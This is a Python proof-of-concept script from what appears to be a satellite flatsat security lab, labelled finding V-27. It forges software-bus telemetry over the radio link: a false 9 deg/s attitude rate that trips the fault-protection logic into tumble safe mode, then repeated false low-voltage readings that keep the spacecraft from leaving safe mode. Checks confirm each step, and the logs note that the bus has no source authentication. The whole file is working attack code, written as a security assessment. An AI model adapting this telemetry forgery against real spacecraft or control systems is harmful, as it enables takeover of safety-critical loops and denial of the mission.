#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-27  The FDIR consumes the same software-bus MIDs as truth: forging
# one attitude-rate frame launders the attacker straight into the ADCS
# safety loop -> mission-level lateral movement (virtual ADCS takeover).
# SPARTA: LM-0002.02 / impact on control loop
def main(dev, ev):
    dev.tc(0x1D, bytes([10, 0, 1]), via="radio")     # lab time base 0.1x
    r = dev.find(dev.tc(0x1D, b"\x00", via="usb"), 0x1D)[0]
    trig0 = struct.unpack(">I", r.payload[4:8])[0]
    # forge 9.00 deg/s on X (FDIR tumbles at >5 deg/s sustained 2 s)
    dev.tc(0x1B, struct.pack(">H", 0x102) + struct.pack("<hhh", 900, 0, 0),
           via="radio")
    dev.advance(3000)
    f = dev.find(dev.tc(0x1D, b"\x00", via="usb"), 0x1D)[0]
    trig1 = struct.unpack(">I", f.payload[4:8])[0]
    ev.log(f"tilt={f.le16(8)/100:.2f} deg/s safe={f.u8(2)} triggers "
           f"{trig0}->{trig1}")
    check(f.u8(2) == 1, "one forged MID = TUMBLE safe-mode")
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    check(st.payload[-1] & 0x02, "F2_SAFE raised in status")
    ev.log("FDIR cannot distinguish forged rate from real gyro data -- no "
           "source authentication on the bus feeding the safety loop")
    # and the attacker HOLDS safe mode: re-publish a false low-voltage
    # reading, and release stays blocked even after the 120 s window
    dev.tc(0x1B, struct.pack(">H", 0x105) + bytes([10]), via="radio")  # 21.3 V
    dev.advance(121000)                              # ride out release window
    dev.tc(0x1B, struct.pack(">H", 0x105) + bytes([10]), via="radio")  # refresh
    rel = dev.tc(0x1D, bytes([3]), via="usb")
    check(dev.err_text(rel) == "TRIGGER ACTIVE",
          "forged telemetry keeps the trigger condition alive")
    ev.log("=> attacker controls when the mission resumes: deny release by "
           "re-publishing the false low-voltage reading")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-27 FDIR laundering forged MIDs", main))
